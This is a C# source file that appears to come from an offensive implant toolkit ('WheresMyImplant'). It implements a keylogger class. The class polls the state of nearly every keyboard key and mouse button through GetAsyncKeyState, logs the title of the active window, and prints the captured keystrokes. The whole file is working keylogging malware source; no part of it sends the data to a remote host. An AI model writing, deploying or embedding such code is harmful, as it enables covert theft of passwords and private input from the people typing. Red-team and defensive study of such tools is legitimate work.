using System;
using System.Text;
using System.Threading;

using MonkeyWorks.Unmanaged.Libraries;

namespace WheresMyImplant
{
    class KeyLogger : Base
    {
        private Thread thread;
        private ManualResetEvent exitEvent = new ManualResetEvent(false);
        private static Boolean run = true;

        internal KeyLogger()
        {
            Console.CancelKeyPress += (sender, eventArgs) => {
                eventArgs.Cancel = true;
                exitEvent.Set();
            };
        }

        internal void Execute()
        {
            thread = new Thread(() => Monitor());
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
            exitEvent.WaitOne();
            run = false;
            thread.Join(10);
        }

        [STAThread]
        internal static void Monitor()
        {
            StringBuilder hold = new StringBuilder();
            String holdKey = "";
            while (run)
            {
                StringBuilder title = new StringBuilder();
                IntPtr hWnd = user32.GetForegroundWindow();
                UInt32 titleLength = user32.GetWindowTextLength(hWnd) * 2;
                title.EnsureCapacity((Int32)titleLength);
                user32.GetWindowText(hWnd, title, (UInt32)title.Capacity);

                if (hold.ToString() != title.ToString())
                {
                    Console.WriteLine("\n[[{0}]]",title);
                    hold = title;
                }

                String key = GetKey();
                if (holdKey != key)
                {
                    holdKey = key;
                    Console.Write(key);
                }

                kernel32.CloseHandle(hWnd);
                Thread.Sleep(100);
            }
        }

        private static String GetKey()
        {
            String returnVal = "";
            Boolean shift = false;
            //Get Missing Cases
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.KeyCode))
                returnVal += "\n[:KeyCode:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Modifiers))
                returnVal += "\n[:Modifiers:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.None))
                returnVal += "\n[:None:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LButton))
                returnVal += "\n[:LMouse:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.RButton))
                returnVal += "\n[:RMouse:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Cancel))
                returnVal += "\n[:Cancel:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.MButton))
                returnVal += "\n[:MButton:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.XButton1))
                returnVal += "\n[:XButton1:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.XButton2))
                returnVal += "\n[:XButton2:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Back))
                returnVal += "\n[:Backspace:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Tab))
                returnVal += "\n[:Tab:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LineFeed))
                returnVal += "\n[:LineFeed:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Clear))
                returnVal += "\n[:Clear:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Return))
                returnVal += "\n";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Enter))
                returnVal += "\n";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.ShiftKey))
                shift = true;
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.ControlKey))
                returnVal += "\n[:ControlKey:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Menu))
                returnVal += "\n[:Menu:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Pause))
                returnVal += "\n[:Pause:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Capital))
                returnVal += "\n[:Capital:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.CapsLock))
                returnVal += "\n[:CapsLock:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.KanaMode))
                returnVal += "\n[:KanaMode:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.HanguelMode))
                returnVal += "\n[:HanguelMode:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.HangulMode))
                returnVal += "\n[:HangulMode:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.JunjaMode))
                returnVal += "\n[:JunjaMode:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.FinalMode))
                returnVal += "\n[:FinalMode:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.HanjaMode))
                returnVal += "\n[:HanjaMode:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.KanjiMode))
                returnVal += "\n[:KanjiMode:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Escape))
                returnVal += "\n[:Escape:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.IMEConvert))
                returnVal += "\n[:IMEConvert:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.IMENonconvert))
                returnVal += "\n[:IMENonconvert:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.IMEAccept))
                returnVal += "\n[:IMEAccept:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.IMEAceept))
                returnVal += "\n[:IMEAceept:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.IMEModeChange))
                returnVal += "\n[:IMEModeChange:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Space))
                returnVal += " ";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Prior))
                returnVal += "\n[:Prior:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.PageUp))
                returnVal += "\n[:PageUp:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Next))
                returnVal += "\n[:Next:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.PageDown))
                returnVal += "\n[:PageDown:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.End))
                returnVal += "\n[:End:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Home))
                returnVal += "\n[:Home:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Left))
                returnVal += "\n[:Left:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Up))
                returnVal += "\n[:Up:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Right))
                returnVal += "\n[:Right:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Down))
                returnVal += "\n[:Down:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Select))
                returnVal += "\n[:Select:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Print))
                returnVal += "\n[:Print:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Execute))
                returnVal += "\n[:Execute:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Snapshot))
                returnVal += "\n[:Snapshot:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.PrintScreen))
                returnVal += "\n[:PrintScreen:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Insert))
                returnVal += "\n[:Insert:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Delete))
                returnVal += "\n[:Delete:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Help))
                returnVal += "\n[:Help:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D0))
                returnVal += "0";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D1))
                returnVal += "1";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D2))
                returnVal += "2";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D3))
                returnVal += "3";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D4))
                returnVal += "4";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D5))
                returnVal += "5";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D6))
                returnVal += "6";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D7))
                returnVal += "7";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D8))
                returnVal += "8";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D9))
                returnVal += "9";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.A))
                returnVal += shift ? "A" : "a";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.B))
                returnVal += shift ? "B" : "b";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.C))
                returnVal += shift ? "C" : "c";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D))
                returnVal += shift ? "D" : "d";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.E))
                returnVal += shift ? "E" : "e";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F))
                returnVal += shift ? "F" : "f";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.G))
                returnVal += shift ? "G" : "g";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.H))
                returnVal += shift ? "H" : "h";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.I))
                returnVal += shift ? "I" : "i";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.J))
                returnVal += shift ? "J" : "j";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.K))
                returnVal += shift ? "K" : "k";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.L))
                returnVal += shift ? "L" : "l";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.M))
                returnVal += shift ? "M" : "m";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.N))
                returnVal += shift ? "N" : "n";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.O))
                returnVal += shift ? "O" : "o";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.P))
                returnVal += shift ? "P" : "p";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Q))
                returnVal += shift ? "Q" : "q";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.R))
                returnVal += shift ? "R" : "r";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.S))
                returnVal += shift ? "S" : "s";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.T))
                returnVal += shift ? "T" : "t";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.U))
                returnVal += shift ? "U" : "u";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.V))
                returnVal += shift ? "V" : "v";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.W))
                returnVal += shift ? "W" : "w";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.X))
                returnVal += shift ? "X" : "x";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Y))
                returnVal += shift ? "Y" : "y";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Z))
                returnVal += shift ? "Z" : "z";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LWin))
                returnVal += "\n[:LWin:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.RWin))
                returnVal += "\n[:RWin:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Apps))
                returnVal += "\n[:Apps:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Sleep))
                returnVal += "\n[:Sleep:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad0))
                returnVal += "0";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad1))
                returnVal += "1";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad2))
                returnVal += "2";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad3))
                returnVal += "3";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad4))
                returnVal += "4";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad5))
                returnVal += "5";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad6))
                returnVal += "6";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad7))
                returnVal += "7";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad8))
                returnVal += "8";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad9))
                returnVal += "9";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Multiply))
                returnVal += "*";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Add))
                returnVal += "+";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Separator))
                returnVal += "\n[:Separator:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Subtract))
                returnVal += "-";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Decimal))
                returnVal += ".";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Divide))
                returnVal += "/";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F1))
                returnVal += "\n[:F1:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F2))
                returnVal += "\n[:F2:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F3))
                returnVal += "\n[:F3:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F4))
                returnVal += "\n[:F4:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F5))
                returnVal += "\n[:F5:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F6))
                returnVal += "\n[:F6:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F7))
                returnVal += "\n[:F7:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F8))
                returnVal += "\n[:F8:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F9))
                returnVal += "\n[:F9:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F10))
                returnVal += "\n[:F10:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F11))
                returnVal += "\n[:F11:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F12))
                returnVal += "\n[:F12:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F13))
                returnVal += "\n[:F13:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F14))
                returnVal += "\n[:F14:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F15))
                returnVal += "\n[:F15:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F16))
                returnVal += "\n[:F16:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F17))
                returnVal += "\n[:F17:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F18))
                returnVal += "\n[:F18:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F19))
                returnVal += "\n[:F19:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F20))
                returnVal += "\n[:F20:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F21))
                returnVal += "\n[:F21:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F22))
                returnVal += "\n[:F22:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F23))
                returnVal += "\n[:F23:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F24))
                returnVal += "\n[:F24:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumLock))
                returnVal += "\n[:NumLock:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Scroll))
                returnVal += "\n[:Scroll:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LShiftKey))
                returnVal += "";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.RShiftKey))
                returnVal += "";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LControlKey))
                returnVal += "\n[:LControlKey:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.RControlKey))
                returnVal += "\n[:RControlKey:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LMenu))
                returnVal += "\n[:LMenu:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.RMenu))
                returnVal += "\n[:RMenu:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserBack))
                returnVal += "\n[:BrowserBack:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserForward))
                returnVal += "\n[:BrowserForward:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserRefresh))
                returnVal += "\n[:BrowserRefresh:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserStop))
                returnVal += "\n[:BrowserStop:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserSearch))
                returnVal += "\n[:BrowserSearch:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserFavorites))
                returnVal += "\n[:BrowserFavorites:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserHome))
                returnVal += "\n[:BrowserHome:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.VolumeMute))
                returnVal += "\n[:VolumeMute:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.VolumeDown))
                returnVal += "\n[:VolumeDown:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.VolumeUp))
                returnVal += "\n[:VolumeUp:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.MediaNextTrack))
                returnVal += "\n[:MediaNextTrack:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.MediaPreviousTrack))
                returnVal += "\n[:MediaPreviousTrack:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.MediaStop))
                returnVal += "\n[:MediaStop:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.MediaPlayPause))
                returnVal += "\n[:MediaPlayPause:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LaunchMail))
                returnVal += "\n[:LaunchMail:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.SelectMedia))
                returnVal += "\n[:SelectMedia:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LaunchApplication1))
                returnVal += "\n[:LaunchApplication1:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LaunchApplication2))
                returnVal += "\n[:LaunchApplication2:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemSemicolon))
                returnVal += ";";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem1))
                returnVal += "\n[:Oem1:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oemplus))
                returnVal += "+";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oemcomma))
                returnVal += ",";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemMinus))
                returnVal += "-";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemPeriod))
                returnVal += ".";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemQuestion))
                returnVal += "?";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem2))
                returnVal += "\n[:Oem2:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oemtilde))
                returnVal += "~";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem3))
                returnVal += "\n[:Oem3:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemOpenBrackets))
                returnVal += "[";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem4))
                returnVal += "\n[:Oem4:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemPipe))
                returnVal += "\\";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem5))
                returnVal += "\n[:Oem5:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemCloseBrackets))
                returnVal += "]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem6))
                returnVal += "\n[:Oem6:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemQuotes))
                returnVal += "\"";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem7))
                returnVal += "\n[:Oem7:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem8))
                returnVal += "\n[:Oem8:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemBackslash))
                returnVal += "\n[:OemBackslash:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem102))
                returnVal += "\n[:Oem102:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.ProcessKey))
                returnVal += "\n[:ProcessKey:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Packet))
                returnVal += "\n[:Packet:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Attn))
                returnVal += "\n[:Attn:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Crsel))
                returnVal += "\n[:Crsel:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Exsel))
                returnVal += "\n[:Exsel:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.EraseEof))
                returnVal += "\n[:EraseEof:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Play))
                returnVal += "\n[:Play:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Zoom))
                returnVal += "\n[:Zoom:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NoName))
                returnVal += "\n[:NoName:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Pa1))
                returnVal += "\n[:Pa1:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemClear))
                returnVal += "\n[:OemClear:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Shift))
                returnVal += "\n[:Shift:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Control))
                returnVal += "\n[:Control:]";
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Alt))
                returnVal += "\n[:Alt:]";
            return returnVal;
        }

        public void Dispose()
        {

        }

        ~KeyLogger()
        {
            Dispose();
        }
    }
}
